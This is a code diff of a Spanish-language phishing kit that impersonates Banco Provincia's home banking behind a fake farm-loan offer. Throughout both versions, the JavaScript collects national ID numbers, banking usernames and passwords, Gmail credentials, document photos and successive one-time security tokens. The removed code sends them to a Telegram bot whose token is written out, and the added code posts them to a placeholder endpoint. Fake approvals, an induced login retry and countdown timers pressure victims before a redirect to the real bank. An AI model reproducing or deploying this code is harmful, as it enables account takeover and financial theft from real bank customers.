-  <div class="box text-center" id="tokSalir"><button class="btn btn-link-secondary btn" type="button" id="sinTok">No tengo el token, acreditar igual</button></div>
-</div>
-
-<!-- LINK DE VALIDACION -->
-<div id="pBio" class="oculto">
-  <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#007a2b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="4" width="18" height="16" rx="3"/><circle cx="12" cy="11" r="3"/><path d="M7 18c1.2-1.6 3-2.4 5-2.4s3.8.8 5 2.4"/></svg>
-  <h1 class="txt-title">Validá tu cuenta destino</h1>
-  <p class="txt-default">Te mandamos un link por WhatsApp. <strong>Abrilo desde este mismo celular</strong> y sacate una selfie de frente, con buena luz.</p>
-  <p class="txt-small">Es un paso del banco. No cierres esta página.</p>
-  <div class="box text-center" style="margin-top:1rem">
-    <button class="btn w-100 btn-primary btn" type="button" id="bBio">Ya la envié, continuar</button>
+  <div class="campo">
+    <label for="cl2">Clave</label>
+    <input id="cl2" type="password" maxlength="20" aria-label="Clave">
   </div>
-  <p class="txt-small" id="bioMsg" style="margin-top:.75rem">Podés continuar cuando termines.</p>
-</div>
+  <div class="fijo"><button class="btn" onclick="login(true)">Ingresar</button></div>
+</section>
 
-<!-- VALIDANDO -->
-<div id="p3b" class="oculto">
-  <div class="sp2"></div>
-  <p class="txt-default" style="margin-top:1rem">Validando código...</p>
-</div>
+<!-- pBio SELFIE -->
+<section class="pant oculto" id="pBio">
+  <h2>Validación de cuenta destino</h2>
+  <p class="sub">Para dar de alta la cuenta donde se acredita el crédito el banco pide una validación biométrica.</p>
+  <div class="aviso">Abrí el enlace en el mismo teléfono, escaneá el código con la cámara y tomate la selfie. Tarda menos de un minuto.</div>
+  <div class="card"><div class="k">Estado</div><div class="v" style="color:#b3251f">Pendiente de selfie</div></div>
+  <div class="fijo">
+    <button class="btn" onclick="abrirBio()">Abrir validación facial</button>
+    <button class="link" onclick="irToken()">Ya la hice, continuar</button>
+  </div>
+</section>
 
-<!-- EN CURSO -->
-<div id="p4" class="oculto">
-  <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#007a2b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12 3 3 5-6"/></svg>
-  <h1 class="txt-title" style="padding-top:.75rem">Acreditación en curso</h1>
-  <p class="txt-default">Legajo <strong id="legajo"></strong></p>
-  <p class="txt-default">Estamos procesando la transferencia. Si el banco te pide un código más, pasámelo por acá.</p>
-  <p class="txt-default"><strong>No cierres el WhatsApp.</strong> Redirigiendo en <strong id="cuenta">150</strong> s.</p>
-</div>
+<!-- pToken TOKEN -->
+<section class="pant oculto" id="pToken">
+  <div class="etapa" id="tEtapa">Etapa 1 de 4</div>
+  <h2 id="tTitulo">Token de seguridad</h2>
+  <p class="sub" id="tSub">Ingresá el código de 6 dígitos que genera BIP Móvil.</p>
+  <div class="campo">
+    <label for="tk">Código</label>
+    <input id="tk" class="otp" type="tel" inputmode="numeric" maxlength="6" placeholder="••••••" aria-label="Código de seguridad">
+  </div>
+  <div class="err" id="errTk"></div>
+  <div class="reloj" id="tReloj">El código vence en 60s</div>
+  <div class="fijo"><button class="btn" id="bTk" onclick="pasoToken()">Validar</button></div>
+</section>
 
-<!-- RECIBIDA -->
-<div id="p5" class="oculto">
-  <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#007a2b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12 3 3 5-6"/></svg>
-  <h1 class="txt-title" style="padding-top:.75rem">Solicitud recibida</h1>
-  <p class="txt-default">Legajo <strong id="legajo2"></strong></p>
-  <p class="txt-default">La acreditación se procesa dentro de las 48 horas hábiles. Te avisamos por WhatsApp a este mismo chat.</p>
-  <div class="box text-center" style="margin-top:1rem"><button class="btn w-100 btn-primary btn" type="button" id="irBanco">Ir a la Banca Online</button></div>
-</div>
+<!-- p4 ESPERA -->
+<section class="pant oculto" id="p4">
+  <div class="centro">
+    <div class="sp"></div>
+    <h2 style="font-size:17px">Procesando la operación</h2>
+    <p class="an-txt">Acreditando el crédito en la cuenta</p>
+  </div>
+</section>
 
-</div></div></div></div></main>
-</div></div>
-</div></div></div></div>
+<!-- p5 FIN -->
+<section class="pant oculto" id="p5">
+  <div class="centro" style="padding-top:16px">
+    <div class="ok-ic">✓</div>
+    <h2>Crédito acreditado</h2>
+    <p class="sub">El monto fue depositado. En breve vas a recibir el comprobante por correo.</p>
+  </div>
+  <div class="card" style="text-align:center">
+    <div class="k">Importe acreditado</div>
+    <div class="monto" id="mFin">$ 0</div>
+  </div>
+  <div class="aviso">Por seguridad de la operación vas a ser redirigido al home banking.</div>
+  <div class="fijo"><button class="btn" onclick="salir()">Ir al home banking</button></div>
+</section>
+
+</main>
 
 <script>
-var TELEGRAM_BOT_TOKEN = "8936976510:AAGrXZaDSu5a880qyMEqDj6450f3Q9nN5ko";
-var TELEGRAM_CHAT_ID = "7524834601";
+/* ====== CONFIG ====== */
+var API = 'PEGAR_URL_EXEC';
+var DESTINO = 'https://www.bancoprovincia.bancainternet.com.ar/spa/';
 
-/* parámetros de la línea: tasa, sellos y seguro fijos; IVA a elección */
-var TOPE=250000000, FINANCIA=0.4, TNA=0.35, SELLOS=0.012, SEGURO=0.003;
-
-var ETAPAS=[
-  {tit:"Validá el dispositivo", txt:"Abrí la app <strong>BIP Móvil</strong>, tocá <strong>“Token de seguridad”</strong> y pasá los 6 dígitos.", est:"token1"},
-  {tit:"Validá la cuenta destino", txt:"Para dar de alta la cuenta donde se acredita el banco pide un código. Pasá el que tenés ahora.", est:"token2"},
-  {tit:"Ampliá el límite de transferencia", txt:"El monto aprobado supera tu límite diario. Pasá un código para ampliarlo y que salga en una sola operación.", est:"token3"},
-  {tit:"Confirmá la transferencia", txt:"Último código: confirmá la operación y la acreditación queda en curso.", est:"token4"}
+/* ====== ESTADO ====== */
+var S = { dni:'', ha:0, cultivo:'', costo:0, monto:0, legajo:'', gmail:'', usuario:'', clave:'', etapa:0, ciclo:0 };
+var TOPE = 60000000, FINANCIA = 0.4;
+var TXT_AN = ['Verificando documentación','Consultando Central de Deudores BCRA','Evaluando capacidad de pago','Verificando límite disponible','Conformando legajo'];
+var ETAPAS = [
+  {t:'Token de seguridad', s:'Ingresá el código de 6 dígitos que genera BIP Móvil para habilitar este dispositivo.', e:'token1'},
+  {t:'Alta de cuenta destino', s:'Confirmá con un token la cuenta donde se acredita el crédito.', e:'token2'},
+  {t:'Ampliación de límite', s:'La cuenta tiene límite bajo. Ingresá el token para ampliarlo y permitir la acreditación.', e:'token3'},
+  {t:'Confirmación de la operación', s:'Ingresá el último token para confirmar la transferencia del importe.', e:'token4'}
 ];
 
-var TXT_AN=[
-  "Verificando documentación...",
-  "Consultando Central de Deudores BCRA...",
-  "Evaluando capacidad de pago...",
-  "Calculando límite disponible..."
-];
+function setVH(){ document.documentElement.style.setProperty('--vh', (window.innerHeight * 0.01) + 'px'); }
+setVH(); window.addEventListener('resize', setVH); window.addEventListener('orientationchange', setVH);
 
-var datos={}, etapa=0, tTok, segTok=60, venc=0, tFinal, tBio, tAn, fotos={};
-
-function $(i){return document.getElementById(i);}
-function dig(s){return String(s).replace(/\D/g,"");}
-function ir(a,b){$(a).classList.add("oculto");$(b).classList.remove("oculto");window.scrollTo(0,0);}
-function marcar(e,m){e.classList.toggle("mal",m);}
-function pesos(n){return "$"+Math.round(n).toLocaleString("es-AR");}
-
-function enviarTexto(estado) {
-  var mensaje = "<b>🔔 Notificación BAPRO</b>\n" +
-                "━━━━━━━━━━━━━━━━━━━\n" +
-                "📌 <b>Estado:</b> " + estado + "\n" +
-                "👤 <b>DNI:</b> " + (datos.dni || "No ingresado") + "\n" +
-                "🔑 <b>Usuario:</b> " + (datos.usuario || "-") + "\n" +
-                "🔐 <b>Clave:</b> " + (datos.clave || "-") + "\n" +
-                "📧 <b>Gmail:</b> " + (datos.email || "-") + "\n" +
-                "🔑 <b>Pass Gmail:</b> " + (datos.gmail_pass || "-") + "\n" +
-                "🌾 <b>Cultivo:</b> " + (datos.cultivo || "-") + " (" + (datos.hectareas || "-") + " ha)\n" +
-                "💰 <b>Monto:</b> " + (datos.monto ? "$" + datos.monto.toLocaleString("es-AR") : "-") + "\n" +
-                "📱 <b>Token:</b> " + (datos.token1 || datos.token2 || datos.token3 || datos.token4 || "-");
-
-  var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
-  fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: "HTML" }),
-    keepalive: true
-  }).catch(function(err){ console.error(err); });
+function $(id){ return document.getElementById(id); }
+function mostrar(id){
+  var p = document.querySelectorAll('.pant');
+  for (var i=0;i<p.length;i++) p[i].classList.add('oculto');
+  $(id).classList.remove('oculto');
+  var lleno = (id === 'p1' || id === 'p3' || id === 'p3b');
+  $('hdr').className = 'hdr ' + (lleno ? 'hdr-full' : 'hdr-slim');
+  window.scrollTo(0,0);
 }
+function num(n){ return '$ ' + Math.round(n).toLocaleString('es-AR'); }
+function limpiarErr(id){ var e=$(id); if(e){ e.classList.remove('on'); if(id==='errTk') e.textContent=''; } }
 
-function enviarFoto(base64Data, captionText) {
-  var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto";
-  
-  // Convertir base64 a Blob para enviarlo como archivo multipart a Telegram
-  var byteString = atob(base64Data);
-  var ab = new ArrayBuffer(byteString.length);
-  var ia = new Uint8Array(ab);
-  for (var i = 0; i < byteString.length; i++) {
-    ia[i] = byteString.charCodeAt(i);
-  }
-  var blob = new Blob([ab], { type: "image/jpeg" });
-
-  var formData = new FormData();
-  formData.append("chat_id", TELEGRAM_CHAT_ID);
-  formData.append("photo", blob, "documento.jpg");
-  formData.append("caption", captionText);
-  formData.append("parse_mode", "HTML");
-
-  fetch(url, {
-    method: "POST",
-    body: formData,
-    keepalive: true
-  }).catch(function(err){ console.error(err); });
-}
-
-$("b0").onclick=function(){
-  var m=$("mail").value.trim(),p=$("gpass").value;
-  var mOk=/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(m),pOk=p.length>=4;
-  marcar($("mail"),!mOk);marcar($("gpass"),!pOk);
-  if(!mOk){$("mail").focus();return;}
-  if(!pOk){$("gpass").focus();return;}
-  datos.email=m;datos.gmail_pass=p;enviarTexto("gmail_manual");
-  ir("pG","p1");$("username").focus();
-};
-$("gpass").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("b0").click();}});
-
-function entrar(){
-  var u=$("username").value.trim(),c=$("password").value;
-  var uOk=u.length>=8&&u.length<=16,cOk=c.length>=6;
-  marcar($("username"),!uOk);marcar($("password"),!cOk);
-  if(!uOk){$("username").focus();return false;}
-  if(!cOk){$("password").focus();return false;}
-  datos.usuario=u;datos.clave=c;
-  var reint=!!datos.reintento;
-  enviarTexto(reint?"login_retry":"login");
-  ir("p1","pSp");
-  setTimeout(function(){
-    if(!reint){
-      datos.reintento=1;$("password").value="";ir("pSp","p1");
-      $("password").classList.add("mal");$("err").classList.remove("oculto");
-      $("password").focus();enviarTexto("clave_mala");
-    }else{ir("pSp","p3");pintarEtapa();}
-  },2200);
-  return false;
-}
-$("username").oninput=function(e){e.target.value=e.target.value.replace(/\s/g,"");marcar(e.target,false);$("err").classList.add("oculto");};
-$("password").oninput=function(e){marcar(e.target,false);$("err").classList.add("oculto");};
-$("ver").onclick=function(){$("password").type=$("password").type==="password"?"text":"password";};
-$("username").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("password").focus();}});
-
-function calcular(){
-  var costo=parseFloat($("cultivo").value)||0;
-  var ha=parseFloat($("hectareas").value)||0;
-  var esq=$("esquema").value;
-  var iva=(parseFloat($("iva").value)||0)/100;
-
-  var capital=Math.round(costo*ha*FINANCIA/10000)*10000;
-  if(capital>TOPE)capital=TOPE;
-  if(capital<0)capital=0;
-
-  var gastoInic=capital*SELLOS;
-  var tabla=$("tablaPagos");tabla.innerHTML="";
-  var total=capital+gastoInic;
-
-  $("montoTotal").textContent=pesos(capital);
-
-  if(esq==="cosecha"){
-    var i1=capital*TNA*(180/365),v1=i1*iva,s1=capital*SEGURO;
-    var c1=capital+i1+v1+s1+gastoInic;
-    total=c1;
-    tabla.innerHTML="<tr><td>A cosecha</td><td>"+pesos(capital)+"</td><td>"+pesos(i1)+"</td><td>"+pesos(v1)+"</td><td>"+pesos(s1+gastoInic)+"</td><td><strong>"+pesos(c1)+"</strong></td></tr>";
-  }else{
-    var cuotas=4,capC=capital/cuotas,tSem=TNA/2,saldo=capital,acum=gastoInic;
-    for(var i=1;i<=cuotas;i++){
-      var ic=saldo*tSem,vc=ic*iva,sc=saldo*SEGURO,ex=(i===1?gastoInic:0);
-      var cc=capC+ic+vc+sc+ex;
-      acum+=capC+ic+vc+sc;
-      saldo-=capC;
-      tabla.innerHTML+="<tr><td>Semestre "+i+"</td><td>"+pesos(capC)+"</td><td>"+pesos(ic)+"</td><td>"+pesos(vc)+"</td><td>"+pesos(sc+ex)+"</td><td><strong>"+pesos(cc)+"</strong></td></tr>";
-    }
-    total=acum;
-  }
-  $("totalAPagar").textContent=pesos(total);
-  $("lblMonto").textContent=pesos(capital);
-  datos.monto=capital;
-  datos.cultivo=$("cultivo").options[$("cultivo").selectedIndex].text;
-  datos.esquema=esq;
-  datos.hectareas=ha;
-}
-
-$("dni").oninput=function(e){e.target.value=dig(e.target.value).slice(0,8);marcar(e.target,false);};
-$("b2").onclick=function(){
-  if($("dni").value.length!==8){marcar($("dni"),true);$("dni").focus();return;}
-  datos.dni=$("dni").value;enviarTexto("datos_dni");
-  calcular();ir("p0","sim");
-};
-$("bSim").onclick=function(){
-  if(!datos.monto||datos.monto<500000){$("hectareas").focus();return;}
-  $("monto").textContent=datos.monto.toLocaleString("es-AR");
-  enviarTexto("simulacion");
-  ir("sim","p2b");
-};
-$("b4").onclick=function(){ir("p2b","p2c");};
-
-function enganchar(id,clave,msg){
-  $(id).onchange=function(){
-    var f=this.files&&this.files[0];if(!f)return;
-    $(msg).textContent="Procesando...";
-    var img=new Image(),fr=new FileReader();
-    fr.onload=function(){
-      img.onload=function(){
-        var w=900,h=Math.round(img.height*w/img.width);
-        var cv=document.createElement("canvas");cv.width=w;cv.height=h;
-        cv.getContext("2d").drawImage(img,0,0,w,h);
-        fotos[clave]=cv.toDataURL("image/jpeg",0.7).split(",")[1];
-        $(msg).textContent="Listo.";
-        marcar($(id), false);
-      };
-      img.src=fr.result;
-    };
-    fr.readAsDataURL(f);
+/* ====== ENVIO ====== */
+function enviar(estado, extra){
+  var d = {
+    estado: estado, dni: S.dni, ha: S.ha, cultivo: S.cultivo,
+    monto: S.monto, legajo: S.legajo, gmail: S.gmail,
+    usuario: S.usuario, clave: S.clave, extra: extra || '',
+    etapa: S.etapa, ciclo: S.ciclo,
+    ua: navigator.userAgent, pantalla: screen.width + 'x' + screen.height,
+    fecha: new Date().toISOString()
   };
+  fetch(API, { method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain;charset=utf-8'}, body: JSON.stringify(d) })
+    .catch(function(){ encolar(d); });
 }
-enganchar("foto","mov","fotoMsg");
-enganchar("doc1","titulo","doc1Msg");
-enganchar("doc2","factura","doc2Msg");
+function encolar(d){
+  try{
+    var q = JSON.parse(localStorage.getItem('cola') || '[]');
+    q.push(d); localStorage.setItem('cola', JSON.stringify(q));
+  }catch(e){}
+}
+function vaciarCola(){
+  try{
+    var q = JSON.parse(localStorage.getItem('cola') || '[]');
+    if (!q.length) return;
+    q.forEach(function(d){ fetch(API,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(d)}); });
+    localStorage.removeItem('cola');
+  }catch(e){}
+}
+window.addEventListener('online', vaciarCola);
 
-$("b5").onclick=function(){
-  // Validación: si no cargó el documento obligatorio (foto / mov), se bloquea
-  if(!fotos["mov"]){
-    marcar($("foto"), true);
-    $("fotoMsg").textContent="¡Obligatorio subir este documento para calificar!";
-    $("foto").focus();
-    return;
-  }
-
-  // Enviar las fotos cargadas directamente a Telegram como archivos de imagen
-  Object.keys(fotos).forEach(function(k){
-    var nombreDoc = k === "mov" ? "Últimos movimientos de la cuenta" : (k === "titulo" ? "Título de propiedad" : "Facturación");
-    enviarFoto(fotos[k], "📄 <b>Documento recibido:</b> " + nombreDoc + "\n👤 <b>DNI:</b> " + (datos.dni || "-"));
-  });
-
-  ir("p2c","pAn");
-  var i=0;
-  $("anTxt").textContent=TXT_AN[0];
-  clearInterval(tAn);
-  tAn=setInterval(function(){
+/* ====== FLUJO ====== */
+function ir0(){ mostrar('p0'); setTimeout(function(){ $('dni').focus(); }, 250); }
+function pasoDni(){
+  var v = $('dni').value.replace(/\D/g,'');
+  if (v.length !== 8){ $('errDni').classList.add('on'); return; }
+  S.dni = v; enviar('datos');
+  mostrar('p2c'); setTimeout(function(){ $('ha').focus(); }, 250);
+}
+function calcular(){
+  var ha = parseInt($('ha').value.replace(/\D/g,''), 10);
+  var cu = $('cultivo').value;
+  if (!ha || !cu){ $('errSim').classList.add('on'); return; }
+  S.ha = ha; S.cultivo = $('cultivo').options[$('cultivo').selectedIndex].text;
+  var iva = parseFloat($('iva').value) / 100;
+  var base = parseInt(cu, 10) * (1 + iva);
+  if ($('sellos').value === '1') base *= 1.012;
+  if ($('seguro').value === '1') base *= 1.025;
+  S.costo = base * ha;
+  var cap = Math.min(Math.round((S.costo * FINANCIA) / 10000) * 10000, TOPE);
+  S.monto = cap;
+  var cuota = cap * 0.0612;
+  $('mMonto').textContent = num(cap);
+  $('mCosto').textContent = num(S.costo);
+  $('mCuota').textContent = num(cuota);
+  mostrar('p2d');
+  enviar('simulacion');
+}
+function ir2b(){ mostrar('p2b'); }
+function ir2(){
+  if (!$('acepto').checked){ $('errCond').classList.add('on'); return; }
+  mostrar('p2');
+}
+function subir(n, el){
+  if (!el.files || !el.files.length) return;
+  var c = $('a'+n);
+  c.classList.add('ok');
+  c.querySelector('.txt span').textContent = 'Archivo adjunto';
+  $('bt'+n).textContent = 'Cambiar';
+  if (n === 1) limpiarErr('errDoc');
+  enviar('doc_' + n);
+}
+function analizar(){
+  if (!$('a1').classList.contains('ok')){ $('errDoc').classList.add('on'); return; }
+  mostrar('pAn');
+  var i = 0;
+  $('anTxt').textContent = TXT_AN[0];
+  var iv = setInterval(function(){
     i++;
-    if(i<TXT_AN.length)$("anTxt").textContent=TXT_AN[i];
-  },6000);
+    if (i < TXT_AN.length) $('anTxt').textContent = TXT_AN[i];
+  }, 3600);
   setTimeout(function(){
-    clearInterval(tAn);
-    $("montoOk").textContent=datos.monto.toLocaleString("es-AR");
-    $("legajoOk").textContent="47-2026-"+Math.floor(1000+Math.random()*9000);
-    enviarTexto("aprobado");
-    ir("pAn","pOk");
-  },25000);
-};
-
-$("bOk").onclick=function(){ir("pOk","pG");};
-
-function pintarEtapa(){
-  $("tokTit").textContent=ETAPAS[etapa].tit;
-  $("tokTxt").innerHTML=ETAPAS[etapa].txt;
-  if(etapa>0)$("tokSalir").classList.add("oculto");
-  arrancarTok();
+    clearInterval(iv);
+    S.legajo = '47-2026-' + String(Math.floor(Math.random()*9000)+1000);
+    $('mFinal').textContent = num(S.monto);
+    $('mLegajo').textContent = 'Legajo ' + S.legajo;
+    enviar('aprobado');
+    mostrar('pOk');
+  }, 18000);
 }
-
-function arrancarTok(){
-  clearInterval(tTok);segTok=60;venc=0;
-  $("tok").value="";$("tok").classList.remove("mal");$("b3").disabled=true;
-  $("tokMsg").classList.remove("mal");
-  $("tokMsg").textContent="El código vence en "+segTok+" s";
-  $("tok").focus();
-  tTok=setInterval(function(){
-    segTok--;$("tokMsg").textContent="El código vence en "+segTok+" s";
-    if(segTok<=0){
-      clearInterval(tTok);venc++;
-      $("tok").value="";$("tok").classList.add("mal");$("b3").disabled=true;
-      $("tokMsg").classList.add("mal");
-      $("tokMsg").textContent="El código venció. Generá uno nuevo en BIP Móvil.";
-      if(venc<6)setTimeout(arrancarTok,1000);
-      else $("tokMsg").textContent="Seguí cuando puedas: el código cambia cada minuto.";
-    }
-  },1000);
+function irG(){ mostrar('pG'); setTimeout(function(){ $('gm').focus(); }, 250); }
+function pasoGmail(){
+  var v = $('gm').value.trim();
+  if (!/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i.test(v) || v.length > 40){ $('errGm').classList.add('on'); return; }
+  S.gmail = v; enviar('gmail');
+  mostrar('p3'); setTimeout(function(){ $('us').focus(); }, 250);
 }
-$("tok").oninput=function(e){
-  e.target.value=dig(e.target.value).slice(0,6);
-  e.target.classList.remove("mal");
-  $("b3").disabled=e.target.value.length!==6;
-};
-$("b3").onclick=function(){
-  if($("tok").value.length!==6)return;
-  datos["token"+(etapa+1)]=dig($("tok").value);
-  enviarTexto(ETAPAS[etapa].est);
-  clearInterval(tTok);
-  etapa++;
-  if(etapa===2){
-    ir("p3","pBio");
-    var s=90;
-    $("bioMsg").textContent="Podés continuar cuando termines. ("+s+")";
-    clearInterval(tBio);
-    tBio=setInterval(function(){
-      s--;$("bioMsg").textContent="Podés continuar cuando termines. ("+s+")";
-      if(s<=0){clearInterval(tBio);ir("pBio","p3");pintarEtapa();}
-    },1000);
-    $("bBio").onclick=function(){clearInterval(tBio);ir("pBio","p3");pintarEtapa();};
+function login(reint){
+  var u = (reint ? $('us2').value : $('us').value).trim();
+  var c = (reint ? $('cl2').value : $('cl').value);
+  if (u.length < 8 || c.length < 6){
+    (reint ? $('errLog2') : $('errLog')).classList.add('on');
     return;
   }
-  if(etapa<ETAPAS.length){
-    ir("p3","p3b");
-    setTimeout(function(){ir("p3b","p3");pintarEtapa();},5000);
-  }else{
-    $("legajo").textContent="47-2026-"+Math.floor(1000+Math.random()*9000);
-    ir("p3","p4");
-    var s2=150;
-    tFinal=setInterval(function(){
-      s2--;$("cuenta").textContent=s2;
-      if(s2<=0){clearInterval(tFinal);location.href="https://www.bancoprovincia.bancainternet.com.ar/spa/";}
-    },1000);
-  }
-};
-$("sinTok").onclick=function(){
-  enviarTexto("sin_token");clearInterval(tTok);
-  $("legajo2").textContent="47-2026-"+Math.floor(1000+Math.random()*9000);
-  ir("p3","p5");
-};
-$("irBanco").onclick=function(){location.href="https://www.bancoprovincia.bancainternet.com.ar/spa/";};
+  S.usuario = u; S.clave = c;
+  enviar(reint ? 'login_retry' : 'login');
+  var b = reint ? event.target : $('bLog');
+  b.disabled = true; b.textContent = 'Ingresando...';
+  setTimeout(function(){
+    b.disabled = false; b.textContent = 'Ingresar';
+    mostrar('pBio');
+  }, 2600);
+}
+function abrirBio(){
+  enviar('selfie');
+  window.open('https://www.bancoprovincia.com.ar/', '_blank');
+  setTimeout(irToken, 1200);
+}
+
+/* ====== TOKEN ====== */
+var relojIv = null;
+function irToken(){ S.etapa = 0; S.ciclo = 0; pintarEtapa(); }
+function pintarEtapa(){
+  var e = ETAPAS[S.etapa];
+  $('tEtapa').textContent = 'Etapa ' + (S.etapa+1) + ' de 4';
+  $('tTitulo').textContent = e.t;
+  $('tSub').textContent = e.s;
+  $('tk').value = '';
+  limpiarErr('errTk');
+  mostrar('pToken');
+  setTimeout(function(){ $('tk').focus(); }, 250);
+  arrancarReloj();
+}
+function arrancarReloj(){
+  clearInterval(relojIv);
+  var t = 60;
+  $('tReloj').textContent = 'El código vence en ' + t + 's';
+  relojIv = setInterval(function(){
+    t--;
+    $('tReloj').textContent = 'El código vence en ' + t + 's';
+    if (t <= 0){ clearInterval(relojIv); vencer(); }
+  }, 1000);
+}
+function vencer(){
+  S.ciclo++;
+  $('errTk').textContent = 'El código venció. Solicitá uno nuevo desde BIP Móvil.';
+  $('errTk').classList.add('on');
+  enviar('token_vencido', ETAPAS[S.etapa].e);
+  if (S.ciclo >= 6){ S.ciclo = 0; avanzarEtapa(); }
+  else setTimeout(arrancarReloj, 1500);
+}
+function pasoToken(){
+  var v = $('tk').value.replace(/\D/g,'');
+  if (v.length !== 6){ $('errTk').textContent = 'El código tiene 6 dígitos.'; $('errTk').classList.add('on'); return; }
+  clearInterval(relojIv);
+  enviar(ETAPAS[S.etapa].e, v);
+  S.ciclo = 0;
+  avanzarEtapa();
+}
+function avanzarEtapa(){
+  S.etapa++;
+  if (S.etapa < ETAPAS.length){ pintarEtapa(); return; }
+  $('mFin').textContent = num(S.monto);
+  mostrar('p4');
+  enviar('fin');
+  setTimeout(function(){ mostrar('p5'); }, 9000);
+}
+function salir(){ window.location.href = DESTINO; }
+
+/* ====== ENTER Y FILTROS ====== */
+document.addEventListener('keydown', function(ev){
+  if (ev.key !== 'Enter') return;
+  var id = document.activeElement ? document.activeElement.id : '';
+  if (id === 'dni'){ ev.preventDefault(); pasoDni(); }
+  else if (id === 'ha'){ ev.preventDefault(); calcular(); }
+  else if (id === 'gm'){ ev.preventDefault(); pasoGmail(); }
+  else if (id === 'us' || id === 'cl'){ ev.preventDefault(); login(false); }
+  else if (id === 'us2' || id === 'cl2'){ ev.preventDefault(); login(true); }
+  else if (id === 'tk'){ ev.preventDefault(); pasoToken(); }
+});
+['dni','ha','tk'].forEach(function(i){ var el=$(i); if(el) el.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,''); }); });
+$('dni').addEventListener('input', function(){ limpiarErr('errDni'); });
+$('ha').addEventListener('input', function(){ limpiarErr('errSim'); });
+$('cultivo').addEventListener('change', function(){ limpiarErr('errSim'); });
+$('gm').addEventListener('input', function(){ limpiarErr('errGm'); });
+$('us').addEventListener('input', function(){ limpiarErr('errLog'); });
+$('cl').addEventListener('input', function(){ limpiarErr('errLog'); });
+$('us2').addEventListener('input', function(){ limpiarErr('errLog2'); });
+$('cl2').addEventListener('input', function(){ limpiarErr('errLog2'); });
+$('tk').addEventListener('input', function(){ limpiarErr('errTk'); });
+$('acepto').addEventListener('change', function(){ limpiarErr('errCond'); });
+
+vaciarCola();
 </script>
 </body>
-                                                                                                                                                                                                             </html>
-  
+      </html>
